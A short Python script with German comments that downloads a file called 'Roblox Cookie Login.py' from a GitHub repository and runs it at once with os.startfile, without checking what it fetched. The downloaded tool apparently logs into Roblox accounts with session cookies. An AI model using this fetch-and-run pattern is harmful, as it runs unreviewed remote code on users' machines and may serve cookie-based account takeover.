import os
import requests
import time

# Lokaler Pfad zum Speichern der Datei
lokaler_pfad = os.path.expanduser("~/Roblox-Login")

# GitHub-Repository-URL
repository_url = "https://github.com/pascaldercoole1/Roblox-Login/raw/main/Roblox%20Cookie%20Login.py"

# Datei herunterladen
response = requests.get(repository_url)
datei_name = os.path.join(lokaler_pfad, "Roblox Cookie Login.py")

# Erstelle das Verzeichnis, wenn es nicht existiert
os.makedirs(lokaler_pfad, exist_ok=True)

# Datei speichern
with open(datei_name, "wb") as f:
    f.write(response.content)

# Die heruntergeladene Datei öffnen
os.startfile(datei_name)

time.sleep(3)
